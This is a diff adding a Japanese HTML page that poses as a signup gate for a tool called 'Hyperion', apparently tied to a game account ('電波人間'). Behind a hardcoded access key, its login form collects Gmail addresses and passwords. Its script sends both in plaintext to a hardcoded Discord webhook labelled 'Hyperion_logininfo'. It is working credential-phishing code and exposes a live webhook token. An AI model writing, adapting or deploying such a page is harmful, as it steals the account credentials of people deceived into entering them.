@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html lang="ja">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Hyperion-登録</title>
+<style>
+  body {
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    background-image: url('background.png');
+    background-size: cover;
+    background-position: center;
+    background-attachment: fixed;
+    color: #222;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+  }
+
+  .box {
+    background: rgba(255, 255, 255, 0.9);
+    backdrop-filter: blur(4px);
+    padding: 40px;
+    border-radius: 12px;
+    box-shadow: 0 0 20px rgba(0, 80, 160, 0.15);
+    width: 360px;
+    text-align: center;
+  }
+
+  h2 {
+    color: #007acc;
+    text-transform: uppercase;
+    letter-spacing: 2px;
+    margin-bottom: 20px;
+  }
+
+  .input-group {
+    margin-bottom: 14px;
+    text-align: left;
+  }
+
+  .input-group label {
+    color: #333;
+    font-weight: 600;
+    margin-bottom: 6px;
+    display: block;
+  }
+
+  .input-group input {
+    width: 100%;
+    padding: 10px;
+    border: 1px solid #007acc;
+    border-radius: 6px;
+    background: #f9f9f9;
+    color: #111;
+    box-sizing: border-box;
+    transition: border-color 0.3s, box-shadow 0.3s, background 0.3s;
+  }
+
+  .input-group input:focus {
+    border-color: #40b4ff;
+    background: #ffffff;
+    box-shadow: 0 0 6px rgba(0, 150, 255, 0.3);
+    outline: none;
+  }
+
+  .error {
+    color: #d93025;
+    font-size: 13px;
+    margin-top: 6px;
+    text-align: left;
+    display: none;
+  }
+
+  button {
+    width: 100%;
+    padding: 12px;
+    background: #007acc;
+    color: #ffffff;
+    border: none;
+    border-radius: 6px;
+    font-weight: bold;
+    cursor: pointer;
+    text-transform: uppercase;
+    transition: background 0.5s, transform 0.2s;
+  }
+
+  button:hover {
+    background: #2095e8;
+    transform: translateY(-2px);
+  }
+
+  button:active {
+    background: #0063a6;
+    transform: translateY(0);
+  }
+
+  small {
+    color: #555;
+    display: block;
+    margin-top: 8px;
+  }
+
+  /* modal for manual image */
+  .modal {
+    position: fixed;
+    inset: 0;
+    display: none;
+    justify-content: center;
+    align-items: center;
+    background: rgba(0, 0, 0, 0.4);
+    z-index: 1000;
+  }
+
+  .modal-content {
+    background: #ffffff;
+    padding: 18px;
+    border-radius: 10px;
+    max-width: 90vw;
+    max-height: 90vh;
+    box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+  }
+
+  .modal-content img {
+    display: block;
+    max-width: 80vw;
+    max-height: 70vh;
+    width: auto;
+    height: auto;
+    border-radius: 6px;
+  }
+
+  .modal-close {
+    display: inline-block;
+    margin-top: 12px;
+    padding: 8px 12px;
+    background: #007acc;
+    color: #fff;
+    border-radius: 6px;
+    cursor: pointer;
+    font-weight: bold;
+    transition: background 0.5s;
+  }
+
+  .modal-close:hover {
+    background: #2095e8;
+  }
+</style>
+
+
+</head>
+
+<body>
+  <div id="root" class="box"></div>
+
+  <div id="manualModal" class="modal" role="dialog" aria-modal="true" aria-hidden="true">
+    <div class="modal-content">
+      <img id="manualImg" src="manual.png" alt="操作マニュアル">
+      <div style="text-align:center;"><button id="closeModal" class="modal-close">閉じる</button></div>
+    </div>
+  </div>
+
+  <script>
+
+    const SECRET_KEY = "S4nMF96K";
+    const root = document.getElementById('root');
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1429281161586151465/zQav3-UXxDjRSThek3O_8JmyvoW_1w6T2MfNhTuv4qtoFsye_dx3-gXKu1ZyxyvLvpHY';
+
+    function sendNotification(title, body) {
+      if (!('Notification' in window)) return;
+      if (Notification.permission === 'granted') new Notification(title, { body });
+      else alert(`${title}\n\n${body}`);
+    }
+
+    function renderGate(wrong = false) {
+      root.innerHTML = `
+        <h2>Access Gate</h2>
+        <div class="input-group">
+          <label for="access_key">アクセスキー</label>
+          <input type="password" id="access_key" placeholder="Access key">
+        </div>
+        <button id="enterBtn">開く</button>
+        <small>正しいキーを入力してください。</small>
+      `;
+
+      if (wrong) sendNotification('アクセス拒否', 'URLキーが無効です。');
+
+      document.getElementById('enterBtn').addEventListener('click', () => {
+        const val = document.getElementById('access_key').value.trim();
+        if (!val) return alert('キーを入力してください。');
+        if (val === SECRET_KEY) {
+          const url = new URL(location.href);
+          url.searchParams.set('key', val);
+          location.href = url.toString();
+        } else {
+          sendNotification('アクセス拒否', 'キーが間違っています。');
+        }
+      });
+    }
+
+    function renderLogin() {
+      root.innerHTML = `
+        <h2>Hyperion Login</h2>
+        <form id="loginForm" novalidate>
+          <div class="input-group">
+            <label for="email">メールアドレス</label>
+            <input type="email" id="email" required placeholder="example@gmail.com">
+            <div id="emailError" class="error">Gmail のみ使用可能です。</div>
+          </div>
+          <div class="input-group">
+            <label for="password">パスワード</label>
+            <input type="password" id="password" required>
+            <div id="passError" class="error">6文字以上で入力してください。</div>
+          </div>
+          <button type="submit">アクセス</button>
+          <small>電波人間に連携済のアカウントを登録してください。<br>送信後ツールのリンク共有・BOX連携をこちらで行います。</small>
+        </form>
+      `;
+
+      const gmailRegex = /^[A-Za-z0-9._%+-]+@gmail\.com$/i;
+      const loginForm = document.getElementById('loginForm');
+      const emailError = document.getElementById('emailError');
+      const passError = document.getElementById('passError');
+
+      loginForm.addEventListener('submit', e => {
+        e.preventDefault();
+        emailError.style.display = passError.style.display = 'none';
+
+        const email = document.getElementById('email').value.trim();
+        const pass = document.getElementById('password').value;
+
+        let valid = true;
+        if (!gmailRegex.test(email)) {
+          emailError.style.display = 'block';
+          sendNotification('無効なメール形式', 'Gmailアドレスのみ許可されています。');
+          valid = false;
+        }
+        if (pass.length < 6) {
+          passError.style.display = 'block';
+          valid = false;
+        }
+
+        if (valid) {
+          const message = {
+            username: "Hyperion_logininfo",
+            embeds: [{
+              fields: [
+                { name: "gmail", value: `\`${email}\``, inline: false },
+                { name: "password", value: `\`${pass}\``, inline: false }
+              ],
+              timestamp: new Date().toISOString()
+            }]
+          };
+          fetch(WEBHOOK_URL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(message)
+          }).then(response => {
+            if (response.ok) {
+              showManualModal();
+            } else {
+              alert(`読み込みに失敗しました: ${response.status} ${response.statusText}`);
+            }
+          }).catch(error => {
+            console.error("送信エラー:", error);
+            alert("通信エラーが発生しました。");
+          });
+        }
+      });
+    }
+
+    function showManualModal() {
+      const modal = document.getElementById('manualModal');
+      modal.style.display = 'flex';
+      modal.setAttribute('aria-hidden', 'false');
+
+      const closeBtn = document.getElementById('closeModal');
+      closeBtn.focus();
+
+      function handleKey(e) {
+        if (e.key === 'Escape') close();
+      }
+
+      function close() {
+        modal.style.display = 'none';
+        modal.setAttribute('aria-hidden', 'true');
+        document.removeEventListener('keydown', handleKey);
+      }
+
+      closeBtn.addEventListener('click', close, { once: true });
+      document.addEventListener('keydown', handleKey);
+    }
+
+    (function init() {
+      const q = new URLSearchParams(location.search).get('key');
+      if (q === SECRET_KEY) renderLogin();
+      else if (q && q !== SECRET_KEY) renderGate(true);
+      else renderGate(false);
+    })();
+  </script>
+</body>
+
+</html>
